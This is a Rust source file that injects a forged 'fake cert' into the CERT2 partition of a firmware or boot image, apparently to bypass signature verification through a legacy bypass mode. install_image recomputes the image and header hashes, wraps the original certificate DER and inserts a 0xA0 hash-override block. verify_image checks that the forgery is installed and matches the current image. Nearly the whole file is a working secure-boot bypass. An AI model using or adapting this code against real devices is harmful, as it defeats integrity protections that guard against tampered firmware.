//! CERT2 fake cert injection (legacy bypass_mode=1) and verification.

use crate::mkimg;
use crate::der;
use sha2::{Sha256, Sha384, Digest};

fn alg_from_len(n: usize) -> Option<&'static str> {
    match n {
        32 => Some("sha256"),
        48 => Some("sha384"),
        _ => None,
    }
}

fn compute_hash(data: &[u8], alg: &str) -> Vec<u8> {
    match alg {
        "sha256" => Sha256::digest(data).to_vec(),
        "sha384" => Sha384::digest(data).to_vec(),
        _ => panic!("unknown alg"),
    }
}

/// Locate CERT2 and the target image part in a parsed image.
fn find_cert2_and_target(parts: &[mkimg::Part]) -> (Option<(usize, usize, usize, &mkimg::PartHdr)>, Option<(usize, usize, usize, &mkimg::PartHdr)>) {
    let mut cert2_entry = None;
    for (idx, p) in parts.iter().enumerate() {
        if p.hdr.img_type == mkimg::IMG_TYPE_CERT2 {
            cert2_entry = Some((idx, p.off, p.data_off, &p.hdr));
            break;
        }
    }
    let cert2 = match cert2_entry {
        Some(c) => c,
        None => return (None, None),
    };
    let c_off = cert2.1;
    let mut target_part = None;
    for (idx, p) in parts.iter().enumerate() {
        if p.off < c_off && (p.hdr.img_type & 0xff000000) != mkimg::IMG_TYPE_GROUP_CERT {
            target_part = Some((idx, p.off, p.data_off, &p.hdr));
        }
    }
    (Some(cert2), target_part)
}

fn compute_hash_inputs(data: &[u8], target_part: &(usize, usize, usize, &mkimg::PartHdr)) -> (Vec<u8>, Vec<u8>) {
    let (_, t_off, t_data_off, t_hdr) = *target_part;
    let img_hdr_sz = if t_hdr.hdr_sz != 0 { t_hdr.hdr_sz as usize } else { mkimg::PART_HDR_SIZE };
    let header_bytes = data[t_off..t_off + img_hdr_sz].to_vec();
    let padded_size = t_hdr.padded_data_size();
    let data_bytes = data[t_data_off..t_data_off + padded_size].to_vec();
    (header_bytes, data_bytes)
}

fn replace_cert2_blob(data: &[u8], c_blob_off: usize, c_off: usize, c_hdr: &mkimg::PartHdr, new_blob: &[u8]) -> Vec<u8> {
    let new_dsz = new_blob.len();
    let old_padded = c_hdr.padded_data_size();
    let new_padded = mkimg::roundup(new_dsz, c_hdr.align_sz as usize);
    let mut out = data.to_vec();
    // Replace blob region
    let pad = new_padded - new_dsz;
    let mut padded_blob = new_blob.to_vec();
    padded_blob.extend(std::iter::repeat(0u8).take(pad));
    // Ensure out is large enough
    if out.len() < c_blob_off + old_padded {
        // pad out if needed
        out.resize(c_blob_off + old_padded, 0);
    }
    out[c_blob_off..c_blob_off + old_padded].copy_from_slice(&padded_blob);
    // Update part_hdr.dsize at offset 4 from c_off
    out[c_off + 4..c_off + 8].copy_from_slice(&(new_dsz as u32).to_le_bytes());
    out
}

/// Inject legacy fake cert into image bytes; return signed image bytes.
pub fn install_image(data: &[u8]) -> anyhow::Result<Vec<u8>> {
    println!("Image: {} bytes", data.len());

    let parts = mkimg::parse_parts(data);
    if parts.is_empty() {
        anyhow::bail!("no part_hdr_t headers found");
    }
    let (cert2_entry, target_part) = find_cert2_and_target(&parts);
    let cert2 = cert2_entry.ok_or_else(|| anyhow::anyhow!("CERT2 partition header not found"))?;
    let target = target_part.ok_or_else(|| anyhow::anyhow!("no target image partition found before CERT2; cannot compute hashes"))?;

    let (_, c_off, c_blob_off, c_hdr) = cert2;
    let der_blob = &data[c_blob_off..c_blob_off + c_hdr.dsize as usize];
    println!("CERT2: off=0x{:08x}  blob=0x{:08x}  dsize={}", c_off, c_blob_off, c_hdr.dsize);

    // Idempotent: strip any previous install's prefix
    let recovered = der::recover_original_der(der_blob);
    if recovered.len() != der_blob.len() {
        println!("[INFO] existing legacy prefix detected and stripped ({} bytes); will re-inject",
            der_blob.len() - recovered.len());
    }

    // Original CERT2 DER SEQUENCE (0x30) that the legacy wrapper must enclose
    let (original_cert2_der, original_rel) = der::find_original_cert2_der(recovered)?;
    println!("Original CERT2 DER at rel=0x{:x}, size={}", original_rel, original_cert2_der.len());

    // Identify hash algorithm from the original DER
    let hdr_bit = der::find_oid_bitstring(recovered, der::OID_IMAGE_HEADER_HASH);
    let img_bit = der::find_oid_bitstring(recovered, der::OID_IMAGE_HASH);
    let (hdr_bit, img_bit) = match (hdr_bit, img_bit) {
        (Some(h), Some(i)) if !h.is_empty() && !i.is_empty() => (h, i),
        _ => anyhow::bail!("Image Header Hash / Image Hash OID not found in CERT2"),
    };
    let old_hdr_digest = &hdr_bit[1..];
    let old_img_digest = &img_bit[1..];
    let alg = alg_from_len(old_hdr_digest.len())
        .or_else(|| alg_from_len(old_img_digest.len()))
        .ok_or_else(|| anyhow::anyhow!(
            "cannot identify hash algorithm (header len={}, image len={})",
            old_hdr_digest.len(), old_img_digest.len()
        ))?;

    let (header_bytes, data_bytes) = compute_hash_inputs(data, &target);
    let new_hdr_digest = compute_hash(&header_bytes, alg);
    let new_img_digest = compute_hash(&data_bytes, alg);

    println!("Algorithm: {}", alg);
    println!("  old header hash: {}", hex::encode(old_hdr_digest));
    println!("  new header hash: {}", hex::encode(&new_hdr_digest));
    println!("  old image  hash: {}", hex::encode(old_img_digest));
    println!("  new image  hash: {}", hex::encode(&new_img_digest));

    // Legacy prefix: BIT STRING(original DER) + 0xA0 hash override
    let legacy_block = der::build_bitstring_tlv(original_cert2_der);
    let insert_block = build_hash_override_block(&new_hdr_digest, &new_img_digest);
    println!("Legacy BIT STRING wrapper: {} bytes", legacy_block.len());
    println!("Override block 0xA0: {} bytes", insert_block.len());

    let mut new_blob = Vec::new();
    new_blob.extend_from_slice(&legacy_block);
    new_blob.extend_from_slice(&insert_block);
    new_blob.extend_from_slice(recovered);

    let out_bytes = replace_cert2_blob(data, c_blob_off, c_off, c_hdr, &new_blob);
    let new_padded = mkimg::roundup(new_blob.len(), c_hdr.align_sz as usize);
    println!("New CERT2 dsize={}  padded={}  align={}", new_blob.len(), new_padded, c_hdr.align_sz);
    Ok(out_bytes)
}

fn build_hash_override_block(header_digest: &[u8], image_digest: &[u8]) -> Vec<u8> {
    let mut parts = Vec::new();
    parts.push(der::build_oid_tlv(der::OID_IMAGE_HEADER_HASH));
    parts.push(der::build_bitstring_tlv(header_digest));
    parts.push(der::build_oid_tlv(der::OID_IMAGE_HASH));
    parts.push(der::build_bitstring_tlv(image_digest));
    let mut inner = Vec::new();
    for p in &parts { inner.extend_from_slice(p); }
    let mut out = vec![0xA0];
    out.extend(der::encode_length(inner.len()));
    out.extend(inner);
    out
}

/// Verify that a fake cert is installed and hashes match current image content.
pub fn verify_image(data: &[u8]) -> anyhow::Result<()> {
    println!("Image: {} bytes", data.len());
    let parts = mkimg::parse_parts(data);
    if parts.is_empty() {
        println!("[ERROR] no part_hdr_t headers found");
        std::process::exit(1);
    }
    let (cert2_entry, target_part) = find_cert2_and_target(&parts);
    let cert2 = match cert2_entry {
        Some(c) => c,
        None => {
            println!("[ERROR] CERT2 partition header not found");
            std::process::exit(1);
        }
    };
    let target = match target_part {
        Some(t) => t,
        None => {
            println!("[ERROR] no target image partition found before CERT2");
            std::process::exit(1);
        }
    };

    let (_, c_off, c_blob_off, c_hdr) = cert2;
    let der_blob = &data[c_blob_off..c_blob_off + c_hdr.dsize as usize];

    // Legacy layout: BIT STRING(wrapper) + 0xA0(override) + original DER
    let first = match der::find_first_tlv(der_blob) {
        Some(f) => f,
        None => {
            println!("[FAIL] no legacy BIT STRING wrapper at start of CERT2 (off=0x{:08x}) - fake cert not installed", c_off);
            std::process::exit(1);
        }
    };
    if !(first.0 == 0 && first.2 == 3) {
        println!("[FAIL] no legacy BIT STRING wrapper at start of CERT2 (off=0x{:08x}) - fake cert not installed", c_off);
        std::process::exit(1);
    }
    let wrapper_size = first.4;

    let after_bs = &der_blob[first.4..];
    let second = match der::find_first_tlv(after_bs) {
        Some(s) => s,
        None => {
            println!("[FAIL] legacy BIT STRING present ({} bytes) but no 0xA0 override block after it", wrapper_size);
            std::process::exit(1);
        }
    };
    if !(second.0 == 2 && second.1 && second.2 == 0) {
        println!("[FAIL] legacy BIT STRING present ({} bytes) but no 0xA0 override block after it", wrapper_size);
        std::process::exit(1);
    }
    let block_size = second.4;

    let override_content = &after_bs[second.3..second.4];
    let inj_hdr_bit = der::find_oid_bitstring(override_content, der::OID_IMAGE_HEADER_HASH);
    let inj_img_bit = der::find_oid_bitstring(override_content, der::OID_IMAGE_HASH);
    let (inj_hdr_bit, inj_img_bit) = match (inj_hdr_bit, inj_img_bit) {
        (Some(h), Some(i)) if !h.is_empty() && !i.is_empty() => (h, i),
        _ => {
            println!("[FAIL] 0xA0 override block present ({} bytes) but missing header/image hash OID", block_size);
            std::process::exit(1);
        }
    };
    let inj_hdr = &inj_hdr_bit[1..];
    let inj_img = &inj_img_bit[1..];
    let alg = match alg_from_len(inj_hdr.len()) {
        Some(a) => a,
        None => {
            println!("[FAIL] cannot identify injected hash algorithm (length {})", inj_hdr.len());
            std::process::exit(1);
        }
    };

    let (header_bytes, data_bytes) = compute_hash_inputs(data, &target);
    let cur_hdr = compute_hash(&header_bytes, alg);
    let cur_img = compute_hash(&data_bytes, alg);

    println!("CERT2 off=0x{:08x}  legacy layout detected", c_off);
    println!("  BIT STRING wrapper: {} bytes", wrapper_size);
    println!("  0xA0 override block: {} bytes", block_size);
    println!("Algorithm: {}", alg);
    println!("  injected header hash: {}", hex::encode(inj_hdr));
    println!("  current  header hash: {}", hex::encode(&cur_hdr));
    println!("  injected image  hash: {}", hex::encode(inj_img));
    println!("  current  image  hash: {}", hex::encode(&cur_img));

    let hdr_ok = inj_hdr == cur_hdr.as_slice();
    let img_ok = inj_img == cur_img.as_slice();
    if hdr_ok && img_ok {
        println!("[OK] fake cert installed and hashes match current image content (valid)");
    } else {
        println!("[WARN] fake cert installed but hashes do not match current image content (content changed, re-install needed)");
        if !hdr_ok { println!("  - header hash mismatch"); }
        if !img_ok { println!("  - image hash mismatch"); }
        std::process::exit(1);
    }
    Ok(())
}
